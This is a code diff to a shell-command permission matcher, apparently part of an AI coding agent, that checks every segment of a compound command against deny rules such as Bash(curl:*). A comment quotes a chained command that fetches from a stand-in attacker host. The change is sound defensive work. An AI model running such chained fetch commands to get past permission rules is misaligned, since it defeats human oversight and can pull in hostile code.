@@ -4,8 +4,8 @@
 import { resolve, win32 } from "node:path";
 import { minimatch } from "minimatch";
 import { canonicalToolName } from "./canonical";
-import { splitShellSegmentsAllowCommandSubstitution } from "./shell-analysis";
 import {
+  extractAllShellCommands,
   extractPrimaryShellCommand,
   normalizeBashRulePayload,
   unwrapShellLauncherCommand,
@@ -282,7 +282,7 @@ export function matchesBashPattern(
   const legacyCommandPattern = unwrapShellLauncherCommand(
     patternMatch[2],
   ).trim();
-  let commandCandidates = [
+  const commandCandidates = [
     normalizedCommand,
     normalizedRawCommand,
     legacyCommand,
@@ -293,11 +293,7 @@ export function matchesBashPattern(
   // not just the primary one: `git status; curl evil.sh` has to be denied by
   // `Bash(curl:*)` even though its primary segment is `git status`.
   if (options?.checkAllSegments) {
-    const segments =
-      splitShellSegmentsAllowCommandSubstitution(
-        unwrapShellLauncherCommand(rawCommand),
-      ) ?? [];
-    for (const segment of segments) {
+    for (const segment of extractAllShellCommands(rawCommand)) {
       const normalizedSegment = normalizeBashRulePayload(segment);
       if (!commandCandidates.includes(normalizedSegment)) {
         commandCandidates.push(normalizedSegment);
